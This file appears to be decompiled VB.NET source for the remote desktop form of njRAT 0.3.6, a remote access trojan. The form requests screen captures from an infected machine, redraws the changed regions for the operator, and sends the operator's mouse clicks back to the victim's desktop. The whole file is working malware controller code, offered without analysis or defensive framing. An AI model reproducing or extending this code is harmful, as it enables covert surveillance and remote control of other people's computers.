Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class cap

    Public osk As Client
    Public QQ As String
    Public sk As Client
    Private st As Boolean
    Public SZ As Size

    Public Sub New()
        Me.QQ = ""
        Me.st = False
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Start") Then
            Me.Button1.Text = "Stop"
            Me.sk.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(Me.ComboBox1.SelectedIndex), ind.Y, Me.ComboBox2.Text, ind.Y, Conversions.ToString(Me.c.Value)}))
        Else
            Me.Button1.Text = "Start"
        End If
    End Sub

    Private Sub Button1_MouseEnter(sender As Object, e As EventArgs) Handles Button1.MouseEnter
        Me.Panel1.Visible = True
    End Sub

    Private Sub cap_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.sk.CN = False
    End Sub

    Private Sub cap_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.QQ = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Text = Me.QQ
        Dim q As Integer = 0
        Do
            Me.ComboBox1.Items.Add(Me.QZ(q))
            q += 1
        Loop While (q <= 13)
        Dim item As Integer = 1
        Do
            Me.ComboBox2.Items.Add(item)
            item += 1
        Loop While (item <= 10)
        Me.P1.Image = New Bitmap(Me.SZ.Width, Me.SZ.Height)
        Me.ComboBox1.SelectedIndex = 0
        Me.ComboBox2.SelectedIndex = 3
        Me.Timer1.Enabled = True
    End Sub

    Private Sub cap_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim box As PictureBox = Me.P1
        SyncLock box
        End SyncLock
    End Sub

    Private Sub cap_ResizeBegin(sender As Object, e As EventArgs) Handles Me.ResizeBegin
        Dim box As PictureBox = Me.P1
        SyncLock box
        End SyncLock
    End Sub

    Private Sub cap_ResizeEnd(sender As Object, e As EventArgs) Handles Me.ResizeEnd
        Me.st = False
    End Sub

    Private Sub P1_MouseDown(sender As Object, e As MouseEventArgs) Handles P1.MouseDown
        If (Me.Button1.Text <> "Start") Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.SZ.Width) / CDbl(Me.P1.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.SZ.Height) / CDbl(Me.P1.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 2
            End If
            If (e.Button = MouseButtons.Right) Then
                num = 8
            End If
            Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(point.X), ind.Y, Conversions.ToString(point.Y), ind.Y, Conversions.ToString(num)}))
        End If
    End Sub

    Private Sub P1_MouseEnter(sender As Object, e As EventArgs) Handles P1.MouseEnter
        Me.Panel1.Visible = False
    End Sub

    Private Sub P1_MouseUp(sender As Object, e As MouseEventArgs) Handles P1.MouseUp
        If (Me.Button1.Text <> "Start") Then
            Dim num As Integer
            Dim point As New Point(CInt(Math.Round(CDbl((e.X * (CDbl(Me.SZ.Width) / CDbl(Me.P1.Width)))))), CInt(Math.Round(CDbl((e.Y * (CDbl(Me.SZ.Height) / CDbl(Me.P1.Height)))))))
            If (e.Button = MouseButtons.Left) Then
                num = 4
            End If
            If (e.Button = MouseButtons.Right) Then
                num = &H10
            End If
            Me.sk.Send(String.Concat(New String() {"@", ind.Y, Conversions.ToString(point.X), ind.Y, Conversions.ToString(point.Y), ind.Y, Conversions.ToString(num)}))
        End If
    End Sub
    Public Sub PktToImage(ByVal BY As Byte())
        Dim ptr As IntPtr
        Dim instance As Array = FN.fx(BY, "njq8")
        Dim stream As New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Byte()))
        Dim bitmap2 As Bitmap = CType(Drawing.Image.FromStream(stream), Bitmap)
        Dim b As Byte() = DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing), Byte())
        NewLateBinding.LateIndexSetComplex(instance, New Object() {0, b}, Nothing, True, False)
        Dim strArray As String() = Strings.Split(FN.BS(b), ",", -1, CompareMethod.Binary)
        Me.Text = String.Concat(New String() {Me.QQ, " Size: ", FN.siz(Conversions.ToString(CLng(BY.Length))), " ,Changes: ", Conversions.ToString(CInt((strArray.Length - 2)))})
        Dim image As Bitmap = DirectCast(Me.P1.Image.GetThumbnailImage(Conversions.ToInteger(Strings.Split(strArray(0), ".", -1, CompareMethod.Binary)(0)), Conversions.ToInteger(Strings.Split(strArray(0), ".", -1, CompareMethod.Binary)(1)), Nothing, ptr), Bitmap)
        Dim graphics As Graphics = graphics.FromImage(image)
        Dim y As Integer = 0
        Dim num4 As Integer = (strArray.Length - 2)
        Dim i As Integer = 1
        Do While (i <= num4)
            Dim point As New Point(Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(0)), Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(1)))
            Dim size As New Size(bitmap2.Width, Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(2)))
            Dim rect As New Rectangle(0, y, bitmap2.Width, Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(2)))
            Dim point2 As New Point(Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(0)), Conversions.ToInteger(Strings.Split(strArray(i), ".", -1, CompareMethod.Binary)(1)))
            graphics.DrawImage(bitmap2.Clone(rect, bitmap2.PixelFormat), point2)
            y = (y + size.Height)
            i += 1
        Loop
        graphics.Dispose()
        Me.P1.Image = DirectCast(image.Clone, Image)
        If (Me.Button1.Text = "Stop") Then
            Me.sk.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(Me.ComboBox1.SelectedIndex), ind.Y, Me.ComboBox2.Text, ind.Y, Conversions.ToString(Me.c.Value)}))
        End If
    End Sub

    Public Function QZ(ByVal q As Integer) As Size
        Dim size2 As New Size(CType(Me.SZ, Point))
        Select Case q
            Case 0
                Return Me.SZ
            Case 1
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.1))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.1))))
                Exit Select
            Case 2
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.3))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.3))))
                Exit Select
            Case 3
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.5))))
                Exit Select
            Case 4
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 1.9))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 1.9))))
                Exit Select
            Case 5
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2))))
                Exit Select
            Case 6
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.1))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.1))))
                Exit Select
            Case 7
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.2))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.2))))
                Exit Select
            Case 8
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 2.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 2.5))))
                Exit Select
            Case 9
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 3))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 3))))
                Exit Select
            Case 10
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 3.5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 3.5))))
                Exit Select
            Case 11
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 4))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 4))))
                Exit Select
            Case 12
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 5))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 5))))
                Exit Select
            Case 13
                size2.Width = CInt(Math.Round(CDbl((CDbl(size2.Width) / 6))))
                size2.Height = CInt(Math.Round(CDbl((CDbl(size2.Height) / 6))))
                Exit Select
        End Select
        size2.Width = Conversions.ToInteger((Strings.Mid(size2.Width.ToString, 1, (size2.Width.ToString.Length - 1)) & Conversions.ToString(0)))
        size2.Height = Conversions.ToInteger((Strings.Mid(size2.Height.ToString, 1, (size2.Height.ToString.Length - 1)) & Conversions.ToString(0)))
        Return size2
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If (Not Me.osk.CN Or Not Me.sk.CN) Then
            Dim enumerator As IEnumerator
            Me.Timer1.Enabled = False
            Try
                enumerator = Me.Controls.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As Control = DirectCast(enumerator.Current, Control)
                    current.Enabled = False
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub
End Class